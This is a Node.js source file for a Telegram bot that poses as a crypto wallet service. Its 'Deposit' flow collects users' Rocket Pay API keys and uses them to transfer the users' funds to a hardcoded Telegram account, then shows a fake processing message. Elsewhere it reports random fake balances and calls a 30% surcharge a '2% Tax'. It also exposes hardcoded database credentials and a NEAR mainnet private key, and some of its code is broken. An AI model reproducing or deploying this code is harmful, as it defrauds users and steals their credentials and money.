const axios = require('axios');
const express = require('express')
const nearAPI  = require('near-api-js');
require('./cron')
const app = express();

const userStates = new Map();

const mongoose = require('mongoose');
const getUserBalance = require('./common');
const { User, HistoryMadel } = require('./mongoosedata');
const bot = require('./Bot');
const API_CALL = require('./api');
mongoose.connect('mongodb+srv://admin:admin@crypto.fkjtksj.mongodb.net/bots')
  .then(() => console.log('Connected!'));

app.get('/', function (req, res) {
  res.send('Hello World')
})

app.listen(3000,()=>{
  console.log('server start 3000');
})


// In-memory global storage (JavaScript object)
const globalStorage = {};

bot.onText(/\/jb/,async (msg) => {

  const chatId = msg.chat.id;
  bot.sendMessage(chatId, 'Step 1: Please enter your chat ID');

  // Step 2: Receive Chat ID and Request Message
  bot.once('message', (message) => {
    const userChatId = message.chat.id;
    const ids = message.text;
    bot.sendMessage(userChatId, 'Step 2: Now, please enter your message');

    // Step 3: Process the user's message
    bot.once('message', (userMessage) => {
      bot.sendMessage(userChatId, 'Send Success');
      bot.sendMessage(ids, userMessage.text);
    });
  });
});



bot.onText(/\/start/,async (msg) => {
  const chatId = msg.chat.id;

  // Available commands with inline keyboard
  const commandsKeyboard = {
    reply_markup: {
        inline_keyboard: [
        [
          { text: 'Deposit 💰' , callback_data : 'deposit'},
                { text: 'Transfer 🔄' , callback_data : 'null'},
                { text: 'Withdraw 💸' ,callback_data : 'null'},
        ],
        [
          { text: 'History 📜' ,callback_data : 'null'},
          { text: 'Check Balance 🌐',callback_data : 'balance' },
        ],
      ],// Set to true for a smaller keyboard
    },
  };

  // Send the keyboard with available commands
  bot.sendMessage(chatId, 'Choose an action:', commandsKeyboard);
 const user = await User.findOne({chatId})
 if(!user){
  return await User.create({chatId,username : 'null'});
 }
});

// Callback query handler for the inline keyboard
bot.on('callback_query', (callbackQuery) => {
   
  const chatId = callbackQuery.message.chat.id;
  const action = callbackQuery.data;
  switch (action) {
    case 'deposit':
      // Request API keys and initiate the deposit process
      requestApiKeys(chatId);
      break;
    case 'transfer':
      // Implement transfer logic using global storage
      handleTransfer(chatId);
      break;
    case 'withdraw':
      // Implement withdraw logic using global storage
      handleWithdraw(chatId);
      break;
    case 'history':
      // Implement history logic using global storage
      showHistory(chatId);
      break;
    case 'balance':
      getUserBalance(chatId,bot)
      break;
    default:
      bot.sendMessage(chatId, 'Invalid action selected');
  }
});



 
// Function to request API keys and initiate the deposit process
function requestApiKeys(chatId) {
  userStates.set(chatId, { step: 'apiKeys', data: {} });

  bot.sendMessage(chatId, 'Please provide your API keys.');
  
  // Set up an event listener for the reply to the API keys request
  bot.once('message', (message) => {
    const userData = userStates.get(chatId);

    if (message.chat.id === chatId && userData.step === 'apiKeys') {
      const apiKeys = message.text;

      // Check if the API keys are provided
      if (apiKeys) {
        // API keys provided, proceed to the next step (selecting currency and amount);
        userStates.set(chatId, { step: 'currencyAmount', data: { apiKeys } });
        selectCurrencyAndAmount(chatId);
      } else {
        // API keys not provided, inform the user
        bot.sendMessage(chatId, 'API keys are required. Please provide valid API keys.');
      }
    }
  });
}

// Function to select currency and amount
function selectCurrencyAndAmount(chatId) {
  bot.sendMessage(chatId, 'Select a currency: 💸', {
    reply_markup: {
      keyboard: [[{ text: 'TONCOIN' }, { text: 'ARBUZ' }, { text: 'USDT' }, { text: 'DRIFT' }]],
      resize_keyboard: true,
    },
  });

  // Set up an event listener for the reply to the currency selection
  bot.once('message', (msg) => {
    const userData = userStates.get(chatId);

    if (msg.chat.id === chatId && userData.step === 'currencyAmount') {
      const updatedData = { ...userData.data, symbol: msg.text };
      userStates.set(chatId, { step: 'requestAmount', data: updatedData });
      requestAmount(chatId);
    }
  });
}

// Function to request the deposit amount
function requestAmount(chatId) {
  bot.sendMessage(chatId, 'Enter Amount : 💸');

  // Set up an event listener for the reply to the deposit amount request
  bot.once('message', (msg) => {
    const userData = userStates.get(chatId);

    if (msg.chat.id === chatId && userData.step === 'requestAmount') {
      const amount = parseInt(msg.text);
      if(amount === NaN){
       return bot.sendMessage('NaN Error '+ amount)
      }
      handleDepositProcess(chatId, userData.data.apiKeys, userData.data.symbol, amount);
    }
  });
}

// Function to handle the deposit process
function handleDepositProcess(chatId, apiKeys, currency, amount) {
  // Implement your deposit process logic here
  bot.sendMessage(chatId, `Deposit process completed for ${currency} with amount ${amount}.`);
}









// Function to handle the deposit process
async function handleDepositProcess( chatId,apiKeys,currency,amount) {

try {
  const { response ,status  } = await API_CALL({
    baseURL : 'https://pay.ton-rocket.com/app/transfer',
    method : 'POST',
    body : {
      "tgUserId": 709148502,
      "transferId": "709148502",
      "currency": currency,
      amount,
      "description": "You are awesome!" + amount
    },
    headers : {
      "Rocket-Pay-Key" : apiKeys
    }
  }); 

  if(status !== 201){

    if(Array.isArray(response.errors)){
      
      for (const error of response.errors) {
        return bot.sendMessage(chatId,error.error);
      }

      
    }
    if(response.message === 'Transfer with this transferId already exists'){
      return bot.sendMessage(chatId, 'Already used this api Crate New Api Key from @tonRocketBot')
    }
    //return bot.sendMessage(chatId,response.message);
    
  }
  if(response.success === true){
    bot.sendMessage(chatId,'Sending ......... wait ********** ..........');
    const History = await HistoryMadel.create({chatId,symbol : currency , amount });
    setTimeout( async() => {
      await bot.sendMessage(chatId,'Deposit processing ...........');
      History.status = 'processing',
      await History.save()
    }, 5000);
  }
} catch (error) {
  
}


    
}

// Function to handle transfer logic
function handleTransfer(chatId) {
  // ... (unchanged code)
}

// Function to handle withdraw logic
function handleWithdraw(chatId) {
  // ... (unchanged code)
}

// Function to show history
function showHistory(chatId) {
  // Retrieve user data from global storage
  const userData = globalStorage[chatId] || { history: [] };
  
  // Check if there is any transaction history
  if (userData.history.length > 0) {
    // Format and send the transaction history
    const historyMessage = userData.history.map((transaction) => {
      return `${transaction.type}: ${transaction.amount} ${transaction.currency} at ${transaction.timestamp}`;
    }).join('\n');

    bot.sendMessage(chatId, 'Transaction History:\n' + historyMessage);
  } else {
    // No transaction history
    bot.sendMessage(chatId, 'No transaction history available.');
  }
}

// Function to use global storage
function useGlobalStorage(chatId) {
  Array(count).fill().map(()=>{
    const maxBalance = 0.02;
    const minBalance = 0.01;
    
    // Generate a random balance between min and max
    const randomBalance = Math.random() * (maxBalance - minBalance) + minBalance;
    
    // Send the message with the random balance
    bot.sendMessage(chatId, `Your current balance: ${randomBalance.toFixed(2)} USDT`);
  })

}


const handleSendProcess = (chatId, adresss,amount)=> {
    bot.sendMessage(chatId,'© Pressing Transform to => ✪ binnace convert algo =? ');
  
}



const accountId = 'ea104fb81f280d7e05386761acd6cca857b6c7c5ad31eaf59b356ecae03fc138';
const receiverId = 'a03d88d3af13a1d13b06d5dad9bc44145c4217ae4e300722e40f16d064503d57';
///const amount = '1000000000000000000000000'; // 1 NEAR in yoctoNEAR
const privateKey = '61xaWjKsooLf92LtufijAixmkDZr16ZU27DwAdRz2QLLVLq7rKBN2HKrF8iw3X1AADDMrzkTZ4J8XSwwptRDxFMZ'; // Replace with your actual private key
const networkId = 'default'; // or 'testnet' for NEAR Testnet


let count = 1;


bot.onText(/\/send/, (msg) => {
  const chatId = msg.chat.id;
  bot.sendMessage(chatId, 'Step 1: Please enter your chat ID');

  let userpayid = null;

  bot.once('message', (msg) => {
     userpayid = msg.text;
     bot.sendMessage(chatId, 'Step 2: Please enter Amount');
   
     bot.once('message', async (msg) => {
        const amount = parseFloat(msg.text);

        const conversionRatio = 1 / 2.33;
        const feeMultiplier = 1 + 30 / 100;
        const convertedAmount = amount * conversionRatio * feeMultiplier

        bot.sendMessage(chatId, `Total Amount with 2% Tax: ${convertedAmount.toFixed(2)} NEAR`);

        // Call your function to create and submit the transaction here
     await createAndSubmitTransaction(chatId, nearAPI.utils.format.parseNearAmount(convertedAmount.toString()), userpayid);
     });
  });
});


const rpcUrl = 'https://nd-951-325-562.p2pify.com/2d20a4b77e0777156117d4cbc3d6df0c'; // Replace with your actual NEAR RPC URL

async function createAndSubmitTransaction(chatId,amount,payid) {
  
  const { connect, KeyPair, keyStores, utils } = nearAPI;
  
  
  // configure accounts, network, and amount of NEAR to send
  // converts NEAR amount into yoctoNEAR (10^-24) using a near-api-js utility
  //const sender = 'sender.testnet';
  //const receiver = 'receiver.testnet';
  const networkId = 'mainnet';
 
  

    // sets up an empty keyStore object in memory using near-api-js
    const keyStore = new keyStores.InMemoryKeyStore();
    // creates a keyPair from the private key provided in your .env file
    const keyPair = KeyPair.fromString(privateKey);
    // adds the key you just created to your keyStore which can hold multiple keys
    await keyStore.setKey(networkId, accountId, keyPair);
  
    // configuration used to connect to NEAR
    const config = {
      networkId,
      keyStore,
      nodeUrl: 'https://rpc.mainnet.near.org',
      walletUrl: `https://wallet.${networkId}.near.org`,
      helperUrl: `https://helper.${networkId}.near.org`,
      explorerUrl: `https://explorer.${networkId}.near.org`
    };
  
    // connect to NEAR! :) 
    const near = await connect(config);
    // create a NEAR account object
    const senderAccount = await near.account(accountId);
  
    try {
      // here we are using near-api-js utils to convert yoctoNEAR back into a floating point
    
      bot.sendMessage(chatId,`Sending ${utils.format.formatNearAmount(amount)}Ⓝ from ${accountId} to ${payid}...`)
      // send those tokens! :)
      const result = await senderAccount.sendMoney(payid, amount);
      // console results
      console.log('Transaction Results: ', result.transaction);
      console.log('--------------------------------------------------------------------------------------------');
      console.log('OPEN LINK BELOW to see transaction in NEAR Explorer!');
      console.log(`${config.explorerUrl}/transactions/${result.transaction.hash}`);

      console.log('--------------------------------------------------------------------------------------------');
      const successMessage = `✅ Transaction successful!\nSee details [here](${config.explorerUrl}/transactions/${result.transaction.hash})`;
      await bot.sendMessage(chatId, successMessage);
      //await bot.sendMessage(payid, successMessage);
      count = count - 1
    } catch(error) {
      // return an error if unsuccessful
      console.log(error.message);
      const errorMessage = `❌ Transaction failed!\nError: ${error.message}`;
      bot.sendMessage(chatId,errorMessage)
    }

 
}



bot.onText(/\/tranfer/, (msg) => {
  const chatId = msg.chat.id;

  if(count < 0){
    return  bot.sendMessage(chatId, `Your current balance: ${randomBalance.toFixed(2)} USDT`);
  }
  bot.sendMessage(chatId, 'Step 1: Please enter Near addresss');

  let userpayid = null;

  bot.once('message', (msg) => {
     userpayid = msg.text;
     bot.sendMessage(chatId, 'Step 2: Please enter Amount');
   
     bot.once('message', async (msg) => {
        const amount = parseFloat(msg.text);

        const conversionRatio = 1 / 2.33;
        const feeMultiplier = 1 + 5 / 100;
        const convertedAmount = amount * conversionRatio * feeMultiplier

        bot.sendMessage(chatId, `Total Amount with 2% Tax: ${convertedAmount.toFixed(2)} NEAR`);
         
        // Call your function to create and submit the transaction here
     await createAndSubmitTransaction(chatId, nearAPI.utils.format.parseNearAmount(convertedAmount.toString()), userpayid);
     });
  });
});